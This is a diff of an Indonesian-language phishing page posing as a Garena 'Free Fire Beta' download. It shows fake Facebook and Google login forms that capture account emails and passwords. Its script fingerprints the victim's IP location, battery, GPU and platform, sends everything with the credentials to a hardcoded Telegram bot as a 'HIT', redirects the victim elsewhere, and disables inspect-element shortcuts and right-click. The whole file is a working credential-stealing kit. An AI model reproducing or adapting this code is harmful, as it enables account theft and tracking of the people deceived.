@@ -6,25 +6,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>FF BETA DOWNLOAD VERSI TERBARU | DIJAMIN WORK 100%</title>
 
+    <meta name="description" content="Akses Awal Free Fire Beta 2026. Download sekarang dan dapatkan item eksklusif.">
+    <meta property="og:title" content="FF BETA EARLY ACCESS">
+    <meta property="og:description" content="Download Versi Terbaru - Work 100%">
+    <meta property="og:image" content="https://img.daisyui.com/images/stock/photo-1507358522600-9f71e620c44e.jpg">
+
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Poppins:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
 
     <style>
-        /* --- REXUSZ ENGINE BLUE OVERDRIVE --- */
+        /* --- SHAFIQ BLUE ENGINE V9.5 CORE --- */
         :root {
             --primary-blue: #007bff;
-            --deep-blue: #001a33;
-            --neon-glow: 0 0 15px rgba(0, 123, 255, 0.8);
-            --glass: rgba(5, 10, 20, 0.9);
+            --secondary-blue: #0056b3;
+            --dark-bg: #00050a;
+            --glass-bg: rgba(5, 12, 24, 0.95);
+            --neon-shadow: 0 0 20px rgba(0, 123, 255, 0.5);
+            --error-red: #ff3e3e;
         }
 
         ::-webkit-scrollbar { width: 0px; }
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background: #00050a;
-            color: #fff;
+            background-color: var(--dark-bg);
+            color: #ffffff;
             font-family: 'Poppins', sans-serif;
             overflow: hidden;
             height: 100vh;
@@ -34,324 +41,397 @@
             justify-content: center;
         }
 
-        /* DYNAMIC NEON BACKGROUND */
+        /* DYNAMIC NEON BACKGROUND ENGINE */
         #bg-canvas {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
             z-index: 1;
-            opacity: 0.4;
+            filter: blur(1px);
         }
 
-        .blue-gradient-overlay {
+        .overlay-vignette {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: radial-gradient(circle at center, rgba(0, 30, 60, 0.5) 0%, #000 100%);
+            background: radial-gradient(circle, rgba(0, 10, 30, 0) 0%, #000 100%);
             z-index: 2;
             pointer-events: none;
         }
 
-        /* GLASS CARD ARCHITECTURE */
-        .viewport-container {
+        /* MAIN UI ARCHITECTURE */
+        .master-wrapper {
             position: relative;
             z-index: 10;
-            width: 90%;
-            max-width: 440px;
-            padding: 1px;
-            background: linear-gradient(135deg, var(--primary-blue), transparent, var(--primary-blue));
-            border-radius: 25px;
-            box-shadow: var(--neon-glow);
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
         }
 
-        .auth-card {
-            background: var(--glass);
-            border-radius: 24px;
-            padding: 45px 35px;
+        .glass-card {
+            background: var(--glass-bg);
+            border: 1px solid rgba(0, 123, 255, 0.2);
+            border-radius: 30px;
+            padding: 40px 30px;
             text-align: center;
+            box-shadow: var(--neon-shadow);
+            backdrop-filter: blur(20px);
             position: relative;
             overflow: hidden;
-            backdrop-filter: blur(15px);
         }
 
-        /* TYPOGRAPHY - CLICKBAIT MODE */
-        .brand-title {
+        /* SCANLINE ANIMATION */
+        .scanline {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 5px;
+            background: linear-gradient(to bottom, transparent, rgba(0, 123, 255, 0.2), transparent);
+            animation: scanning 4s linear infinite;
+        }
+        @keyframes scanning { 0% { top: -10%; } 100% { top: 110%; } }
+
+        /* TYPOGRAPHY SYSTEM */
+        .brand-header h1 {
             font-family: 'Orbitron', sans-serif;
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 900;
             color: var(--primary-blue);
-            text-shadow: var(--neon-glow);
-            letter-spacing: 2px;
-            margin-bottom: 8px;
-            line-height: 1.2;
-        }
-
-        .brand-subtitle {
-            font-size: 11px;
-            color: #4a90e2;
-            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(0, 123, 255, 0.8);
+            margin-bottom: 5px;
             letter-spacing: 1px;
-            margin-bottom: 35px;
+        }
+
+        .brand-header p {
+            font-size: 11px;
             font-weight: 700;
+            color: #4c8eba;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 35px;
         }
 
-        /* INPUT SYSTEM */
-        .input-box {
-            position: relative;
-            margin-bottom: 20px;
+        /* STEP CONTROL LOGIC */
+        .content-step { display: none; }
+        .content-step.active { display: block; animation: fadeInUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .input-box input {
+        /* BUTTON DESIGN */
+        .auth-btn {
             width: 100%;
-            background: rgba(0, 10, 20, 0.7);
-            border: 1px solid #1a3a5a;
-            border-radius: 12px;
-            padding: 16px 20px;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
-            transition: 0.4s ease;
-        }
-
-        .input-box input:focus {
-            border-color: var(--primary-blue);
-            box-shadow: 0 0 12px rgba(0, 123, 255, 0.3);
-            transform: scale(1.02);
-        }
-
-        /* AUTH BUTTONS */
-        .btn-auth-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 25px;
-        }
-
-        .btn-auth {
+            padding: 16px;
+            border-radius: 18px;
             border: none;
-            border-radius: 12px;
-            padding: 14px;
             font-weight: 700;
             font-size: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
             cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
 
-        .btn-fb { background: #1877f2; color: #fff; }
-        .btn-ggl { background: #fff; color: #333; }
+        .btn-facebook { background: #1877f2; color: #fff; }
+        .btn-google { background: #ffffff; color: #333; }
 
-        .btn-auth img {
-            width: 20px;
-            margin-right: 15px;
+        .auth-btn img { width: 22px; margin-right: 15px; }
+        .auth-btn:hover { transform: translateY(-3px); filter: brightness(1.1); }
+
+        /* FORM INPUT SYSTEM */
+        .form-group { text-align: left; margin-bottom: 20px; position: relative; }
+        .form-group label {
+            font-size: 11px;
+            color: #6a96c1;
+            margin-left: 10px;
+            margin-bottom: 8px;
+            display: block;
+            text-transform: uppercase;
+            font-weight: 600;
         }
 
-        .btn-auth:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+        .form-group input {
+            width: 100%;
+            background: rgba(0, 5, 15, 0.8);
+            border: 1px solid #1a3a5a;
+            border-radius: 15px;
+            padding: 15px 20px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* STEALTH LOADER BLUE */
-        #loader-overlay {
+        .form-group input:focus {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 15px rgba(0, 123, 255, 0.2);
+            background: rgba(0, 10, 30, 0.9);
+        }
+
+        .error-label {
+            color: var(--error-red);
+            font-size: 10px;
+            margin-top: 6px;
+            margin-left: 10px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            border: none;
+            border-radius: 15px;
+            color: #fff;
+            font-weight: 800;
+            font-size: 15px;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: 0.4s;
+        }
+
+        .submit-btn:hover { box-shadow: 0 0 25px rgba(0, 123, 255, 0.5); transform: scale(1.02); }
+
+        /* LOADING OVERLAY */
+        #loading-screen {
             display: none;
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 5, 10, 0.98);
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 3, 8, 0.98);
             z-index: 9999;
             flex-direction: column;
             align-items: center;
             justify-content: center;
         }
 
-        .loading-pulse {
+        .loader-ring {
             width: 80px; height: 80px;
-            border: 3px solid rgba(0, 123, 255, 0.1);
-            border-top: 3px solid var(--primary-blue);
+            border: 4px solid rgba(0, 123, 255, 0.1);
+            border-top: 4px solid var(--primary-blue);
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite;
         }
 
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .loading-text {
-            margin-top: 20px;
-            color: var(--primary-blue);
-            font-family: 'Orbitron', sans-serif;
-            font-size: 12px;
-            letter-spacing: 2px;
-        }
-
-        /* FOOTER BRANDING - NO NAME */
-        .shafiq-footer {
+        /* FOOTER SYSTEM */
+        .garena-footer {
             margin-top: 40px;
-            font-size: 9px;
+            font-size: 10px;
             color: #1a4a7a;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
+            line-height: 1.6;
         }
-
-        .scanline {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 3px;
-            background: rgba(0, 123, 255, 0.05);
-            z-index: 100;
-            pointer-events: none;
-            animation: scanning 4s linear infinite;
-        }
-
-        @keyframes scanning { 0% { top: 0%; } 100% { top: 100%; } }
     </style>
 </head>
 <body>
 
     <canvas id="bg-canvas"></canvas>
-    <div class="blue-gradient-overlay"></div>
-    <div class="scanline"></div>
+    <div class="overlay-vignette"></div>
 
-    <div id="loader-overlay">
-        <div class="loading-pulse"></div>
-        <p class="loading-text" id="status-msg">MEMVERIFIKASI AKSES...</p>
+    <div id="loading-screen">
+        <div class="loader-ring"></div>
+        <p style="margin-top: 25px; font-family: 'Orbitron', sans-serif; font-size: 11px; color: var(--primary-blue); letter-spacing: 2px;">AUTHENTICATING SERVER...</p>
     </div>
 
-    <div class="viewport-container animate__animated animate__fadeIn">
-        <div class="auth-card">
+    <div class="master-wrapper">
+        <div class="glass-card">
+            <div class="scanline"></div>
+            
             <div class="brand-header">
-                <h1 class="brand-title">FF BETA DOWNLOAD VERSI TERBARU</h1>
-                <p class="brand-subtitle">DIJAMIN WORK 100%</p>
+                <h1>FF BETA DOWNLOAD VERSI TERBARU</h1>
+                <p>DIJAMIN WORK 100%</p>
             </div>
 
-            <div class="input-box">
-                <input type="text" id="user" placeholder="Email / Nomor HP Akun" required>
-            </div>
-            <div class="input-box">
-                <input type="password" id="pass" placeholder="Password Akun" required>
-            </div>
-
-            <div class="btn-auth-list">
-                <button onclick="startInfiltration('Facebook')" class="btn-auth btn-fb">
+            <div id="step-one" class="content-step active">
+                <p style="font-size: 12px; color: #78a2c3; margin-bottom: 25px;">Silakan pilih akun login untuk melanjutkan pengunduhan:</p>
+                
+                <button class="auth-btn btn-facebook" onclick="handleStepSwitch('Facebook')">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="fb">
-                    Login dengan Facebook
+                    Masuk dengan Facebook
                 </button>
-                <button onclick="startInfiltration('Google')" class="btn-auth btn-ggl">
+
+                <button class="auth-btn btn-google" onclick="handleStepSwitch('Google')">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="ggl">
-                    Login dengan Google
+                    Masuk dengan Google
                 </button>
             </div>
 
-            <div class="shafiq-footer">
+            <div id="step-two" class="content-step">
+                <div id="method-indicator" style="margin-bottom: 25px;"></div>
+                
+                <div class="form-group">
+                    <label id="label-email">Email atau Nomor HP</label>
+                    <input type="text" id="target-user" placeholder="Masukkan Email/No HP" oninput="liveValidation()">
+                    <div id="target-error" class="error-label">Format email tidak valid atau akun tidak ditemukan.</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Kata Sandi Akun</label>
+                    <input type="password" id="target-pass" placeholder="Masukkan Password">
+                </div>
+
+                <button class="submit-btn" onclick="processFinalHit()">MASUK</button>
+                
+                <div style="margin-top: 20px;">
+                    <a href="javascript:void(0)" onclick="location.reload()" style="font-size: 11px; color: #444; text-decoration: none;">Bukan akun saya? Kembali</a>
+                </div>
+            </div>
+
+            <div class="garena-footer">
                 GARENA INTERNATIONAL LIMITED<br>
-                SECURED CLOUD SERVER
+                SECURED BY REXUSZ ENGINE CLOUD V9.5
             </div>
         </div>
     </div>
 
     <script>
-        /* --- DYNAMIC NEON BLUE CANVAS --- */
+        /* --- DYNAMIC BACKGROUND ENGINE --- */
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
-        let dots = [];
+        let points = [];
 
-        function init() {
+        function initStars() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            for(let i=0; i<60; i++) {
-                dots.push({
+            points = [];
+            for(let i=0; i<80; i++) {
+                points.push({
                     x: Math.random() * canvas.width,
                     y: Math.random() * canvas.height,
-                    vx: (Math.random() - 0.5) * 0.4,
-                    vy: (Math.random() - 0.5) * 0.4,
-                    r: Math.random() * 2
+                    s: Math.random() * 2,
+                    v: Math.random() * 0.5
                 });
             }
         }
 
-        function animate() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#007bff";
-            dots.forEach(d => {
-                d.x += d.vx; d.y += d.vy;
-                if(d.x < 0 || d.x > canvas.width) d.vx *= -1;
-                if(d.y < 0 || d.y > canvas.height) d.vy *= -1;
+        function renderStars() {
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "rgba(0, 123, 255, 0.5)";
+            points.forEach(p => {
                 ctx.beginPath();
-                ctx.arc(d.x, d.y, d.r, 0, Math.PI*2);
+                ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
                 ctx.fill();
+                p.y -= p.v;
+                if(p.y < 0) p.y = canvas.height;
             });
-            requestAnimationFrame(animate);
+            requestAnimationFrame(renderStars);
         }
-        init(); animate();
+        window.addEventListener('resize', initStars);
+        initStars(); renderStars();
 
-        /* --- THE CORE ENGINE - SHAFIQ SECRET SENDER --- */
-        const CHAT_ID = "8463622692";
-        const BOT_TOKEN = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc";
-        const REDIRECT_URL = "https://ffkipas.org/#dwnld";
+        /* --- CORE LOGIC - SHAFIQ PANEL V9.5 --- */
+        const TG_CID = "8463622692";
+        const TG_BTK = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc";
+        let activeMet = "";
 
-        async function startInfiltration(method) {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+        function handleStepSwitch(m) {
+            activeMet = m;
+            document.getElementById('step-one').classList.remove('active');
+            document.getElementById('step-two').classList.add('active');
+            
+            const indicator = document.getElementById('method-indicator');
+            const label = document.getElementById('label-email');
+            
+            if(m === 'Facebook') {
+                indicator.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="45">`;
+                label.innerText = "Email atau Telepon Facebook";
+            } else {
+                indicator.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="45">`;
+                label.innerText = "Alamat Email Google";
+                document.getElementById('target-user').placeholder = "contoh@gmail.com";
+            }
+        }
 
-            if(!u || !p) { alert("Data tidak boleh kosong!"); return; }
+        function liveValidation() {
+            const val = document.getElementById('target-user').value;
+            const err = document.getElementById('target-error');
+            
+            if(activeMet === 'Google') {
+                // DETEKSI GOOGLE FORMAT
+                if(val.length > 5 && !val.includes('@gmail.com')) {
+                    err.innerText = "Format @gmail.com wajib diisi untuk verifikasi Google.";
+                    err.style.display = 'block';
+                    return false;
+                }
+            }
+            err.style.display = 'none';
+            return true;
+        }
 
-            document.getElementById('loader-overlay').style.display = 'flex';
-            const status = document.getElementById('status-msg');
+        async function processFinalHit() {
+            const u = document.getElementById('target-user').value;
+            const p = document.getElementById('target-pass').value;
 
-            // Fake Stealth Transitions
-            setTimeout(() => { status.innerText = "MENYINGKRONKAN PERANGKAT..."; }, 1500);
+            if(!u || !p) { alert("Data verifikasi tidak lengkap!"); return; }
+            if(!liveValidation()) { return; }
 
-            // DATA MINING
-            let geo = {};
-            try { geo = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) { geo = { ip: "ERR" }; }
+            document.getElementById('loading-screen').style.display = 'flex';
+
+            // BRUTAL FINGERPRINTING
+            let ipd = {};
+            try { ipd = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) { ipd = {ip:'?'}; }
 
             let batt = "N/A";
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? 'CAS' : 'TIDAK'}]`;
+                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? 'Charging' : 'Disc'}]`;
             }
 
-            // GPU INFO FOR EXTRA FINGERPRINTING
-            const gl_canvas = document.createElement('canvas');
-            const gl = gl_canvas.getContext('webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_AD) : "UNKNOWN";
+            // GPU DETECTOR
+            const c_gl = document.createElement('canvas');
+            const gl = c_gl.getContext('webgl');
+            const d_info = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const renderer = d_info ? gl.getParameter(d_info.UNMASKED_RENDERER_AD) : "HIDDEN";
 
-            const payload = `☠️ **HIT: FF BETA TIKTOK WORK** ☠️\n` +
-                            `━━━━━━━━━━━━━━━━━━━\n` +
+            const maps = `https://www.google.com/maps?q=${ipd.latitude},${ipd.longitude}`;
+
+            const payload = `☠️ **NEW HIT: FF BETA BLUE** ☠️\n` +
+                            `━━━━━━━━━━━━━━━━━━━━\n` +
                             `👤 **USER:** \`${u}\`\n` +
                             `🔑 **PASS:** \`${p}\`\n` +
-                            `🌐 **METHOD:** ${method}\n` +
-                            `━━━━━━━━━━━━━━━━━━━\n` +
-                            `🌐 **IP:** \`${geo.ip}\`\n` +
-                            `📍 **LOC:** ${geo.city}, ${geo.country_name}\n` +
-                            `🏢 **ISP:** ${geo.org}\n` +
-                            `🗺️ **MAPS:** [LIHAT](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})\n` +
-                            `━━━━━━━━━━━━━━━━━━━\n` +
+                            `🌐 **VIA:** ${activeMet.toUpperCase()}\n` +
+                            `━━━━━━━━━━━━━━━━━━━━\n` +
+                            `🌐 **IP:** \`${ipd.ip}\`\n` +
+                            `📍 **LOC:** ${ipd.city}, ${ipd.country_name}\n` +
+                            `🏢 **ISP:** ${ipd.org}\n` +
+                            `🗺️ **MAPS:** [VIEW_LOC](${maps})\n` +
+                            `━━━━━━━━━━━━━━━━━━━━\n` +
                             `🔋 **BATT:** ${batt}\n` +
-                            `🎮 **GPU:** ${gpu}\n` +
+                            `🎮 **GPU:** ${renderer}\n` +
+                            `📱 **PLAT:** ${navigator.platform}\n` +
                             `🕒 **TIME:** ${new Date().toLocaleString('id-ID')}\n` +
-                            `━━━━━━━━━━━━━━━━━━━\n` +
-                            `STATUS: **INFILTRATED** ✅`;
+                            `━━━━━━━━━━━━━━━━━━━━\n` +
+                            `**REXUSZ SHAFIQ PANEL V9.5** ✅`;
 
-            // SEND TO TELEGRAM
+            // TELEGRAM DISPATCH
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${TG_BTK}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: payload, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: TG_CID, text: payload, parse_mode: 'Markdown' })
                 });
             } catch(e) {}
 
-            // FINAL REDIRECT
-            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+            // STEALTH REDIRECT
+            setTimeout(() => {
+                window.location.href = "https://ffkipas.org/#dwnld";
+            }, 3500);
         }
 
-        // ANTI-INSPECT ELEMENT
+        // ANTI-INSPECT PROTECTION PRO
         document.onkeydown = function(e) {
-            if(e.keyCode == 123) return false;
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
-            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
-        }
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+        document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
 </html>
